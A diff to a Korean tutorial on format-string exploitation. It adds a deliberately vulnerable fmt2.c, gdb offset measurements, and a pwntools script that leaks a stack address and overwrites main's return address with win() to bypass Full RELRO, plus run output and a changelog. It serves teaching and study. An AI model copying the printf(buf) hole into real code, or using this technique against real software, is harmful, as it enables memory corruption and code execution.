@@ -284,11 +284,35 @@ checksec --file=./fmt_relro     # RELRO: Full RELRO
 | `stdout`의 `_IO_FILE` vtable 포인터 | 존재. 2.24부터 vtable이 `__libc_IO_vtables` 구역 안인지 검사하므로 구역 안의 다른 vtable(`_IO_wfile_jumps` 등)로 바꿔 우회하는 기법이 버전마다 바뀐다 | libc 주소 누출, 버전별 기법 |
 | **스택의 반환 주소** | 항상 존재. 맹글링·검사 없음. 카나리와 무관(순차 덮어쓰기가 아니라 `%n`으로 그 자리만 쓴다) | **스택 주소 누출** 한 번 |
 
-가장 단순한 것이 마지막 줄이다. 포맷 스트링은 스택 주소도 같이 누출하므로 **같은 취약점 하나로** 끝난다. 4절의 `fmt.c`에서 입력을 두 번 받도록 바꾼 `fmt2.c`(`for (i = 0; i < 2; i++) { fgets(buf, ...); printf(buf); }`, 마지막은 `return 0`)를 Full RELRO로 빌드한다.
+가장 단순한 것이 마지막 줄이다. 포맷 스트링은 스택 주소도 같이 누출하므로 **같은 취약점 하나로** 끝난다. 4절의 `fmt.c`에서 입력을 두 번 받도록 바꾼 `fmt2.c`를 Full RELRO로 빌드한다. `exit(1)` 대신 `return 0`으로 끝내는 것이 요점이다. `main`의 반환 주소가 실제로 **읽혀야** 표적이 되기 때문이다.
+
+```c
+/* fmt2.c — fmt.c를 입력 두 번 받도록 바꾼 것 */
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void win(void) {
+    puts("[+] win() reached");
+    _exit(0);
+}
+
+int main(void) {
+    char buf[256];
+    int i;
+    setvbuf(stdout, NULL, _IONBF, 0);
+    for (i = 0; i < 2; i++) {
+        if (fgets(buf, sizeof buf, stdin) == NULL) return 1;
+        printf(buf);                 /* ❌ 17행. 1라운드는 누출, 2라운드는 쓰기 */
+    }
+    return 0;                        /* exit()가 아니라 return → main의 반환 주소가 읽힌다 */
+}
+```
 
 ```bash
 gcc -g -O0 -no-pie -Wl,-z,relro,-z,now -o fmt2 fmt2.c
-checksec --file=./fmt2          # RELRO: Full RELRO / PIE: No PIE
+# fmt2.c:17:16: warning: format not a string literal and no format arguments [-Wformat-security]
+checksec --file=./fmt2          # RELRO: Full RELRO / PIE: No PIE (0x400000)
 ```
 
 **1단계: 스택 주소를 하나 누출하고, 반환 주소 자리까지의 거리를 gdb로 잰다.** `%N$p`를 훑으면 `0x7ff...`로 시작하는 값이 여러 개 나온다. 그중 하나를 고르고, gdb에서 그 값과 `main`의 반환 주소 자리(`$rbp+8`)의 차이를 구한다. 이 차이는 프레임 구조가 정하므로 ASLR과 무관하게 **고정**이다.
@@ -296,32 +320,44 @@ checksec --file=./fmt2          # RELRO: Full RELRO / PIE: No PIE
 ```
 $ printf 'AAAAAAAA%%8$p\n' | ./fmt2 | head -1
 AAAAAAAA0x4141414141414141            ← 입력 버퍼는 8번째 인자 (fmt.c와 달리 지역 변수 i가 앞에 있다)
-(gdb) break 13
+$ printf 'AAAAAAAA%%8$p\n' > in2.txt
+$ gdb -q ./fmt2
+(gdb) break 17                        # printf(buf) 줄
 (gdb) run < in2.txt
 (gdb) p $rbp
-$3 = (void *) 0x7fffffffc610
+$1 = (void *) 0x7fffffffc520
 (gdb) x/gx $rbp+8                     ← main의 반환 주소 자리
-0x7fffffffc618: 0x00007ffff7c2a1ca    ← __libc_start_call_main+122
-(gdb) x/gx $rsp+(12-6)*8              ← 12번째 인자가 읽는 스택 슬롯
-0x7fffffffc520: 0x00007fffffffc620    ← = rbp+0x10. 따라서 반환 주소 자리 = (%12$p) - 8
+0x7fffffffc528: 0x00007ffff7c2a1ca    ← __libc_start_call_main+122 (info symbol)
+(gdb) x/gx $rsp+(12-6)*8              ← 12번째 인자가 읽는 스택 슬롯 (6번째 = [rsp])
+0x7fffffffc430: 0x00007fffffffc530    ← = rbp+0x10. 따라서 반환 주소 자리 = (%12$p) - 8
 ```
 
-**2단계: 첫 입력으로 누출, 두 번째 입력으로 반환 주소에 `win`을 쓴다.** `fmtstr_payload`가 바이트 단위 `%hhn` 분할을 만든다. 4.2와 다른 것은 사전의 키뿐이다.
+**2단계: 첫 입력으로 누출, 두 번째 입력으로 반환 주소에 `win`을 쓴다.** `fmtstr_payload`가 바이트 단위 `%hhn` 분할을 만든다. 4.2의 `got_overwrite.py`와 다른 것은 사전의 **키**(GOT 주소 → 스택의 반환 주소 자리)와 오프셋(6 → 8)뿐이다.
 
 ```python
-p.sendline(b'%12$p')                                   # 1라운드: 스택 주소 누출
-ret_slot = int(p.recvline().strip(), 16) - 8           # gdb로 잰 고정 거리
-payload = fmtstr_payload(8, {ret_slot: elf.symbols['win']})   # 2라운드: 반환 주소에 쓰기. 64바이트
+#!/usr/bin/env python3
+# fmt2_x.py — 핵심 흐름만. 완성 스크립트가 아니다
+from pwn import *
+context.arch = 'amd64'
+elf = ELF('./fmt2')
+p = process('./fmt2')
+p.sendline(b'%12$p')                                          # 1라운드: 스택 주소 누출
+leak = int(p.recvline().strip(), 16)
+ret_slot = leak - 8                                           # gdb로 잰 고정 거리
+payload = fmtstr_payload(8, {ret_slot: elf.symbols['win']})   # 2라운드: 반환 주소 자리에 win 쓰기 (64바이트)
+log.info(f'leak={leak:#x} ret_slot={ret_slot:#x} win={elf.symbols["win"]:#x} len={len(payload)}')
 p.sendline(payload)
+print(p.recvall(timeout=2)[-30:]); print('exit', p.poll(True))
 ```
 
 ```
 $ python3 fmt2_x.py
-leak=0x7ffccb83b7a0 ret_slot=0x7ffccb83b798 win=0x4011d6
-b'... [+] win() reached\n'
+[*] leak=0x7ffc353676e0 ret_slot=0x7ffc353676d8 win=0x4011d6 len=64
+b'aaaaba\xd8v65\xfc\x7f[+] win() reached\n'
+exit 0
 ```
 
-`main`이 `return 0`으로 돌아가는 순간 `ret`이 `win`으로 점프한다. 대조군으로 같은 바이너리에 GOT(`elf.got['printf']`)를 쓰면 SIGSEGV(종료 코드 -11)로 끝난다(실측). **읽을 것**: (1) Full RELRO는 "쓰기 표적 하나"를 없앴을 뿐이고, 포맷 스트링처럼 누출을 함께 주는 취약점 앞에서는 한 라운드를 더 요구하는 데 그친다. (2) 입력을 한 번만 받는 프로그램(원래 `fmt.c`)에서는 누출과 쓰기를 한 페이로드에 넣을 수 없으므로 스택 주소를 모른 채 써야 하고, 그때는 스택에 이미 있는 포인터 사슬(`rbp` 체인)을 1차 `%n`으로 조작하는 표의 마지막 행 기법이 필요하다. (3) `exit(1)`로 끝나는 원래 `fmt.c`는 `main`의 반환 주소를 쓰지 않으므로 `printf` 자신의 반환 주소(`printf` 실행 중에도 스택에 있다)가 표적이 된다. 표적을 고르는 기준은 언제나 "쓴 뒤에 **실제로 읽히는** 함수 포인터인가"다.
+`main`이 `return 0`으로 돌아가는 순간 `ret`이 `win`으로 점프하고, `win`은 `_exit(0)`으로 끝나므로 exit 0이다. 대조군으로 같은 스크립트의 사전 키만 GOT(`elf.got['printf']`)로 바꾸면 Full RELRO의 읽기 전용 GOT에 쓰다 SIGSEGV(exit -11)로 끝난다(실측). **읽을 것**: (1) Full RELRO는 "쓰기 표적 하나"를 없앴을 뿐이고, 포맷 스트링처럼 누출을 함께 주는 취약점 앞에서는 한 라운드를 더 요구하는 데 그친다. (2) 입력을 한 번만 받는 프로그램(원래 `fmt.c`)에서는 누출과 쓰기를 한 페이로드에 넣을 수 없으므로 스택 주소를 모른 채 써야 하고, 그때는 스택에 이미 있는 포인터 사슬(`rbp` 체인)을 1차 `%n`으로 조작하는 표의 마지막 행 기법이 필요하다. (3) `exit(1)`로 끝나는 원래 `fmt.c`는 `main`의 반환 주소를 쓰지 않으므로 `printf` 자신의 반환 주소(`printf` 실행 중에도 스택에 있다)가 표적이 된다. 표적을 고르는 기준은 언제나 "쓴 뒤에 **실제로 읽히는** 함수 포인터인가"다.
 
 ## 8. 실제 CVE 사례
 
@@ -375,3 +411,4 @@ b'... [+] win() reached\n'
 | 2026-10-22 | 독자 테스트 반영: 3.1절 "Ubuntu gcc는 -Werror=format-security 기본"을 실측(기본은 -Wformat-security 경고, -Werror는 dpkg-buildflags)으로 정정. 장 참조 표기 정리 | @anthonynoh5202 |
 | 2026-10-22 | 독자 테스트 반영: 7절에 7.1 "Full RELRO에서 GOT 대신 무엇을 덮는가" 추가. 표적 후보표(`__malloc_hook` 류의 2.34 제거를 `nm -D` 호환 심볼과 함께 명시), fmt2.c를 Full RELRO로 빌드해 스택 누출→반환 주소 쓰기 흐름과 GOT 쓰기 대조군(SIGSEGV)을 실측 | @anthonynoh5202 |
 | 2026-10-23 | 기술 검증(2차): 7.1 표를 glibc 소스로 대조(NEWS 2.34 훅 제거·`nm -D` 호환 심볼 `V __malloc_hook@GLIBC_2.2.5` 실측, NEWS 2.24 BZ#20191 vtable 검증·`libioP.h`의 `IO_validate_vtable`/`__libc_IO_vtables`, `sysdeps/.../x86_64/pointer_guard.h`·`nptl/tls.h`의 `PTR_MANGLE`과 `pointer_guard` 오프셋 0x30). 포인터 가드를 "스레드별"에서 프로세스 비밀 값(스레드 TCB에 복사)으로 정정하고 회전량(17비트) 명시. fmt2.c를 Full RELRO로 재빌드해 `%8$p`·gdb `$rbp+8`/`%12$p` 거리·`fmtstr_payload` 64바이트·win 도달·GOT 대조군(-11) 재확인 | 검증팀 |
+| 2026-10-23 | 독자 테스트 2차 반영: 7.1에 `fmt2.c` 전문(20줄)·빌드 경고·`fmt2_x.py` 핵심 흐름(12줄)·기대 출력(exit 0, GOT 대조군 exit -11)을 수록. gdb 중단점을 수록한 소스 기준 17행(`printf(buf)`)으로 맞추고 `$rbp`·`$rbp+8`·`%12$p` 슬롯 값을 재실측 | @anthonynoh5202 |
